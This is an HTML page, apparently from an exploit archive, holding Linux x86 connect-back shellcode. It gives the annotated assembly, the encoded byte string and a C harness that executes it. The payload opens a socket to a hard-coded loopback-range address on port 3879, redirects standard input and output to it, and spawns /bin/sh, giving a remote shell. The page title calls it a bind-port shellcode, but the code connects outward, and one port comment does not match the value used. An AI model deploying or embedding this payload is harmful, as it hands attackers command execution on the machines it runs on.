<html><head><title>Linux/x86 - Bindport TCP/3879</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Connecting shellcode written by lamagra &lt;lamagra@digibel.org&gt;
http://lamagra.seKure.de

May 2000

.file	&quot;connect&quot;
.version	&quot;01.01&quot;
.text
	.align 4
_start:
	#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	movl %esp,%ebp
	xorl %edx,%edx
	movb $102,%edx
	movl %edx,%eax		# 102 = socketcall
	xorl %ecx,%ecx
	movl %ecx,%ebx
	incl %ebx	 		# socket()
	movl %ebx, -8(%ebp)	# 1 = SOCK_STREAM
	incl %ebx
	movl %ebx, -12(%ebp)	# 2 = AF_INET
	decl %ebx			# 1 = SYS_socket
	movl %ecx, -4(%ebp)	# 0 = IPPROTO_IP 
	leal -12(%ebp),%ecx	# put args in correct place
	int  $0x80			# switch to kernel-mode
	xorl %ecx,%ecx
	movl %eax,-12(%ebp)	# save the fd

	# connect(fd,(struct sockaddr *)&amp;struct,16);
	incl %ebx
	movw %ebx,-20(%ebp)	# 2 = PF_INET
	movw $9999,-18(%ebp)	# 9999 = htons(3879);
	movl $0x100007f,-16(%ebp) # htonl(IP) 
	leal -20(%ebp),%eax	# struct sockaddr
	movl %eax,-8(%ebp)	# load the struct
	movb $16,-4(%ebp)		# 16 = sizeof(sockaddr)
	movl %edx,%eax		# 102 = socketcall
	incl %ebx			# 3 = SYS_connect
	leal -12(%ebp),%ecx	# put args in place
	int  $0x80			# call socketcall()

	# dup2(fd,0-1-2)
	xorl %ecx,%ecx
	movb $63,%eax		# 63 = dup2()
	int  $0x80
        incl %ecx
        cmpl $3,%ecx
        jne  -0xa

	# arg[0] = &quot;/bin/sh&quot;
	# arg[1] = 0x0
	# execve(arg[0],arg);
	jmp  0x18
	popl %esi
	movl %esi,0x8(%ebp)
	xorl %eax,%eax
	movb %eax,0x7(%esi)
	movl %eax,0xc(%ebp)
	movb $0xb,%al
	movl %esi,%ebx
	leal 0x8(%ebp),%ecx	
	leal 0xc(%ebp),%edx	
	int  $0x80	
	call -0x1d
	.string &quot;/bin/sh&quot;
*/

#define NAME &quot;connecting&quot;

char code[]=
&quot;\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8&quot;
&quot;\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89&quot;
&quot;\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\xc7\x45\xf0&quot;
&quot;\x7f\x01\x01\x01\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0&quot;
&quot;\x43\x8d\x4d\xf4\xcd\x80\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03&quot;
&quot;\x75\xf6\xeb\x18\x5e\x89\x75\x08\x31\xc0\x88\x46\x07\x89\x45\x0c&quot;
&quot;\xb0\x0b\x89\xf3\x8d\x4d\x08\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff&quot;
&quot;\xff/bin/sh&quot;;


main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf(&quot;%s shellcode\n\tSize = %d\n&quot;,NAME,strlen(code));
  (int)(*funct)();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
